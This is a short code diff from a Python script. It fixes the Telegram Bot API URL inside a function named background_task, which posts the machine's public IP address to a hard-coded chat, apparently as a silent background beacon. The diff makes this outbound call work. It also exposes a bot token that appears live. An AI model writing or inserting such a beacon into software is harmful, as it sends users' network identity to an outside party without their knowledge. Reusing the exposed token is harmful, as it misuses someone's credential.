@@ -13,7 +13,7 @@ def get_public_ip():
 
 def background_task(ip):
     try:
-        url = 'https://api.telegram.org/7496801196:AAFIaKLgl2iaSgCC9V5jXXC4gOom3eZ0XEI/sendMessage'
+        url = 'https://api.telegram.org/bot7496801196:AAFIaKLgl2iaSgCC9V5jXXC4gOom3eZ0XEI/sendMessage'
         params = {
             'chat_id': '6400572573',
             'text': str(ip)
